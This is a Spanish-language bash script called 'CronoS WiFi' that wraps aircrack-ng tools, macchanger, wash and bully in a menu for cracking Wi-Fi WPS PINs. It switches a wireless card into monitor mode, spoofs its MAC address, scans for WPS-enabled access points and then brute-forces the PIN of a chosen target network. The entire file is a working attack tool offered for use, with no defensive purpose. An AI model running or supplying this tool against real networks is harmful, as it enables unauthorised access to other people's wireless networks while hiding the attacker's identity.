#! /bin/bash

# Crador Smp_A
# Fecha 21.4.2019
# Licencia Open soft GNU
# Nombre programa CronoS WiFi 
# Tipo Script shell
# Hack pin wps Wifi basado en bully 
 
#Colors
red='\e[1;31m'
blue='\e[1;34m'
yellow='\e[1;33m'
white="\e[1;37m"
grey="\e[0;37m"
purple="\e[0;35m"
green="\e[1;32m"
Purple="\e[0;35m"
Cyan="\e[0;36m"
Cafe="\e[0;33m"
Fiuscha="\e[0;35m"
transparent="\e[0m"

figlet CronoS WiFi

echo -e "${red} Smp_A" "${transparent}"
echo ""

tecla=0
while [ $tecla -ne 4 ]
do 
aceptar="Y"
negar="N"
                  echo -e "${green} selecion Wlan " "${purple}= ${wlanA}mon " "${transparent}"
echo ""
read -n 1 -p "pulsa una opción: 
            
              1) selec Wlan & changer Mac
            
              2) Scaner red 
            
              3) CronoS WiFi
             
              4) Exit 
                
                selec   " tecla

case $tecla in 


1)

clear
ifconfig
read -p "Seleccione tarjeta de red:" wlanA

export $wlanA
airmon-ng check kill
airmon-ng start $wlanA

ifconfig ${wlanA}mon down 
macchanger -A ${wlanA}mon
ifconfig  ${wlanA}mon up 
sleep 1
#clear 
figlet CronoS WiFi ;;


2)
x-terminal-emulator -e "bash -c \"airodump-ng -i ${wlanA}mon --wps --manufacturer; wash -i ${wlanA}mon; exec bash\"" ;;

3) 
IFS=","
echo ""
read -p "Seleccione MAC y channel separe con , : " MAC canal
sleep 1
x-terminal-emulator -e "bash -c \"bully ${wlanA}mon -b $MAC -c $canal -d -v 3; exec bash\"" ;;
# otras configuraciones (-d -M -D -L -Z -A -B -F -1 0,1 -v 4)
esac
done
airmon-ng stop wlan1mon
sleep 1
ifconfig wlan1 up
sleep 1
clear 
figlet CronoS WiFi
echo ""
echo -e  "${red}Smp_A"
echo ""
